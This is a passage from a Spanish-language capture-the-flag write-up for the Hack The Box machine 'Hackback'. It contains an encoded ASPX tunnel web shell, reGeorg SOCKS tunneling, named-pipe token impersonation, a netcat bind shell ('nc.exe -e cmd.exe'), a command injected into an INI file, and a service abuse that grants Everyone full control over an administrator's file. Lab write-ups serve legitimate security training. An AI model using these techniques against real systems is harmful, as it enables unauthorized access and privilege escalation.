gICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK")); echo 'everything is probably fine...'?>
```

```null
curl -s -X GET "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=92ad4f35468382565efc73f343c5b5f5dbb4206fa5c0284587decc4b34b30845"
```

```null
curl -s -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx'
```

Me conecto con ```reGeorg```

```null
python2 reGeorgSocksProxy.py --url http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx -p 1080

    
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad
  
   
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:1080], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

Me conecto por WINRM como el usuario ```simple``` 

```null
proxychains evil-winrm -i 127.0.0.1 -u 'simple' -p 'ZonoProprioZomaro:-('
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\simple\Documents> 
```

Es la única forma de ganar acceso, ya que hay reglas de firewall implementadas

```null
*Evil-WinRM* PS C:\> netsh advfirewall show currentprofile

Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,BlockOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Not Configured
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

Tengo el ```SeImpersonatePrivileage```

```null
*Evil-WinRM* PS C:\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Listo lo que hay en el directorio ```util```

```null
*Evil-WinRM* PS C:\util> dir -Force


    Directory: C:\util


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2018   3:30 PM                PingCastle
d--h--       12/21/2018   6:21 AM                scripts
-a----         3/8/2007  12:12 AM         139264 Fping.exe
-a----        3/29/2017   7:46 AM         312832 kirbikator.exe
-a----       12/14/2018   3:42 PM           1404 ms.hta
-a----        2/29/2016  12:04 PM         359336 PSCP.EXE
-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE
-a----         5/4/2018  12:21 PM          23552 RawCap.exe
```

Y para el directorio ```scripts```

```null
*Evil-WinRM* PS C:\util\scripts> dir -Force


    Directory: C:\util\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM                spool
-a----       12/21/2018   5:44 AM             84 backup.bat
-a----        3/30/2023   4:29 PM            402 batch.log
-a----       12/13/2018   2:56 PM             93 clean.ini
-a-h--       12/13/2018   2:58 PM            330 dellog.bat
-a----        12/8/2018   9:17 AM           1232 dellog.ps1
-a----        3/30/2023   4:29 PM             35 log.txt
```

Hay un script en batch

```null
*Evil-WinRM* PS C:\util\scripts> type backup.bat
@echo off
:: xcopy c:\projects\*.* \\backupserver\projects\*.* /s /e /k /i /r /d /f
```

Y un archivo de configuración

```null
*Evil-WinRM* PS C:\util\scripts> type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
```

Está tomando un archivo ```log.txt```, al que también tengo acceso

```null
*Evil-WinRM* PS C:\util\scripts> type log.txt
Thu 03/30/2023 16:29:04.02 start
```

Veo el otro script

```null
*Evil-WinRM* PS C:\util\scripts> type dellog.bat
@echo off
rem =scheduled=
echo %DATE% %TIME% start bat >c:\util\scripts\batch.log
powershell.exe -exec bypass -f c:\util\scripts\dellog.ps1 >> c:\util\scripts\batch.log
for /F "usebackq" %%i in (`dir /b C:\util\scripts\spool\*.bat`) DO (
start /min C:\util\scripts\spool\%%i
timeout /T 5
del /q C:\util\scripts\spool\%%i
)
```

EStá ejecutando un script al que no tengo capacidad de lectura y va iterando por cada script en batch. Pero no tengo capacidad de escritura en ```scripts```. Sin embargo, ```clean.ini``` si que lo puedo modificar

```null
*Evil-WinRM* PS C:\util\scripts> icacls clean.ini
clean.ini NT AUTHORITY\SYSTEM:(F)
          BUILTIN\Administrators:(F)
          HACKBACK\project-managers:(M)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\util\scripts> net user simple
User name                    simple
Full Name                    simple
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 8:23:10 PM
Password expires             Never
Password changeable          2/3/2019 8:23:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2023 5:47:37 PM

Logon hours allowed          All

Local Group Memberships      *project-managers     *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Modifico este archivo para que contenga otro LogFile

```null
*Evil-WinRM* PS C:\util\scripts> echo [Main] > clean.ini
*Evil-WinRM* PS C:\util\scripts> echo LifeTime=100 >> clean.ini
*Evil-WinRM* PS C:\util\scripts> echo LogFile=c:\util\scripts\rubbx.txt >> clean.ini
*Evil-WinRM* PS C:\util\scripts> echo Directory=c:\inetpub\logs\logfiles >> clean.ini
```

Al tiempo crea el nuevo archivo

```null
*Evil-WinRM* PS C:\util\scripts> dir -Force


    Directory: C:\util\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM                spool
-a----       12/21/2018   5:44 AM             84 backup.bat
-a----        3/30/2023   6:19 PM            402 batch.log
-a----        3/30/2023   6:17 PM            188 clean.ini
-a-h--       12/13/2018   2:58 PM            330 dellog.bat
-a----        12/8/2018   9:17 AM           1232 dellog.ps1
-a----        3/30/2023   6:14 PM             35 log.txt
-a----        3/30/2023   6:19 PM             35 rubbx.txt
```

Más que un archivo de texto, puedo intentar depositar el contenido en un Named Pipe. Utilizaré pipeserverimpersonate, disponible en [Github](https://github.com/decoder-it/pipeserverimpersonate). Utilizo una ruta de [AppLocker Bypass]() para subir el archivo

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> upload /opt/pipeserverimpersonate.ps1
```

Modifico el ```clean.ini```

```null
*Evil-WinRM* PS C:\util\scripts> echo [Main] > clean.ini
*Evil-WinRM* PS C:\util\scripts> echo LifeTime=100 >> clean.ini
*Evil-WinRM* PS C:\util\scripts> echo LogFile=\\.\pipe\dummypipe >> clean.ini
*Evil-WinRM* PS C:\util\scripts> echo Directory=c:\inetpub\logs\logfiles >> clean.ini
```

Ejecuto el script y obtengo un usuario al cual impersonar

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\pipeserverimpersonate.ps1
Waiting for connection on namedpipe:dummypipe
ImpersonateNamedPipeClient: 1
user=HACKBACK\hacker
OpenThreadToken:True
True
CreateProcessWithToken: False  1058
```

Este usuario si que tiene privilegio para crear archivos dentro del directorio ```spool```, y por tanto puedo tratar de almacenar un batch que gracias a la tarea que se ejecuta en intervalos regulares de tiempo me permita escalar privilegios

Lo primero es crear el archivo bat que quiero que se ejecute

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo 'C:\Windows\System32\spool\drivers\color\nc.exe -lvp 4444 -e cmd.exe' > rubbx.bat
```

Subo el ```nc.exe```

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> upload /opt/nc.exe
```

Retoco el ```pipeimpersonate.ps1``` para abusar del Named Pipe

```null
###we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
echo "user=$user "
copy C:\Windows\System32\spool\drivers\color\rubbx.bat C:\util\scripts\spool\rubbx.bat
```

Gano acceso como el usuario ```hacker```

```null
proxychains rlwrap nc 127.0.0.1 4444
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Otra forma es inyectando un comando en el ```clean.ini```

```null
*Evil-WinRM* PS C:\util\scripts> type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & c:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe -lvp 4444
Directory=c:\inetpub\logs\logfiles
```

Puedo ver la primera flag

```null
C:\Users\hacker\Desktop>type user.txt
type user.txt
922449f8e39c2fb4a8c0ff68d1e99cfe
```

# Escalada

Listo los servicios por el puerto 6666

```null
curl -s -X GET http://10.10.10.128:6666/services | grep -i user
        "displayname":  "Connected User Experiences and Telemetry",
        "displayname":  "User Profile Service",
        "displayname":  "User Access Logging Service",
        "displayname":  "User Experience Virtualization Service",
        "displayname":  "Remote Desktop Services UserMode Port Redirector",
        "name":  "UserLogger",
        "displayname":  "User Logger",
        "name":  "UserManager",
        "displayname":  "User Manager",
        "name":  "wuauserv",
```

Me voy a centrar en ```userlogger```. Miro en que consiste

```null
C:\Windows\system32>reg query HKLM\SYSTEM\CurrentControlSet\Services\userlogger
reg query HKLM\SYSTEM\CurrentControlSet\Services\userlogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\userlogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\userlogger\Security
```

Puedo reiniciar el servicio

```null
C:\Windows\system32>sc stop userlogger
sc stop userlogger
[SC] ControlService FAILED 1062:

The service has not been started.
```

```null
C:\Windows\system32>sc start userlogger
sc start userlogger

SERVICE_NAME: userlogger 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1428
        FLAGS              : 
```

Al arrancarlo le paso como argumento un archivo

```null
C:\Windows\system32>sc start userlogger C:\test.txt
```

```null
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B992-A4F6

 Directory of C:\

12/07/2018  05:17 PM    <DIR>          gophish
12/07/2018  04:57 PM    <DIR>          inetpub
09/15/2018  12:19 AM    <DIR>          PerfLogs
10/19/2022  11:46 AM    <DIR>          Program Files
12/03/2018  02:40 PM    <DIR>          Program Files (x86)
12/21/2018  06:39 AM    <DIR>          Projects
03/31/2023  07:14 AM    <DIR>          Temp
03/31/2023  07:37 AM                58 test.txt.log
12/06/2018  01:46 PM    <DIR>          Users
12/14/2018  04:42 PM    <DIR>          util
03/31/2023  07:04 AM    <DIR>          Windows
               1 File(s)             58 bytes
              10 Dir(s)   8,566,960,128 bytes free
```

Crea un archivo llamado ```test.txt.log```

```null
C:\>type test.txt.log
type test.txt.log
Logfile specified!
Service is starting
Service is running
```

Miro los privilegios con ```icacls```

```null
C:\>icacls test.txt.log
icacls test.txt.log
test.txt.log Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

Le añado ":" al iniciar el servicio

```null
C:\>sc start userlogger C:\test.txt:
```

```null
C:\>icacls test.txt
icacls test.txt
test.txt Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

No le añade el ```.log```. Le paso el ```root.txt```, para que le asigne el privilegio full y con ":" para que no le añada la extensión

```null
C:\>sc start userlogger C:\Users\Administrator\Desktop\root.txt:
```

Pero no está ahí :(

```null
C:\>more < C:\Users\Administrator\Desktop\root.txt
more < C:\Users\Administrator\Desktop\root.txt

                                __...----..
                             .-'           `-.
                            /        .---.._  \
                            |        |   \  \ |
                             `.      |    | | |        _____
                               `     '    | | /    _.-`      `.
                                \    |  .'| //'''.'            \
                                 `---'_(`.||.`.`.'    _.`.'''-. \
                                    _(`'.    `.`.`'.-'  \\     \ \
                                   (' .'   `-._.- /      \\     \ |
                                  ('./   `-._   .-|       \\     ||
                                  ('.\ | | 0') ('0 __.--.  \`----'/
                             _.--('..|   `--    .'  .-.  `. `--..'
               _..--..._ _.-'    ('.:|      .  /   ` 0 `   \
            .'         .-'        `..'  |  / .^.           |
           /         .'                 \ '  .             `._
        .'|                              `.  \`...____.----._.'
      .'.'|         .                      \ |    |_||_||__|
     //   \         |                  _.-'| |_ `.   \
     ||   |         |                     /\ \_| _  _ |
     ||   |         /.     .              ' `.`.| || ||
     ||   /        ' '     |        .     |   `.`---'/
   .' `.  |       .' .'`.   \     .'     /      `...'
 .'     \  \    .'.'     `---\    '.-'   |
)/\ / /)/ .|    \             `.   `.\   \
 )/ \(   /  \   |               \   | `.  `-.
  )/     )   |  |             __ \   \.-`    \
         |  /|  )  .-.      //' `-|   \  _   /
        / _| |  `-'.-.\     ||    `.   )_.--'
        )  \ '-.  /  '|     ''.__.-`\  | 
       /  `-\  '._|--'               \  `.
       \    _\                       /    `---.
       /.--`  \                      \    .''''\
       `._..._|                       `-.'  .-. |
                                        '_.'-./.'
```

Miro las Alternative Data Strings

```null
C:\>more < C:\Users\Administrator\Desktop\root.txt:flag.txt
more < C:\Users\Administrator\Desktop\root.txt:flag.txt
6d29b069d4de8eed1a2f1e62f7d02515 
```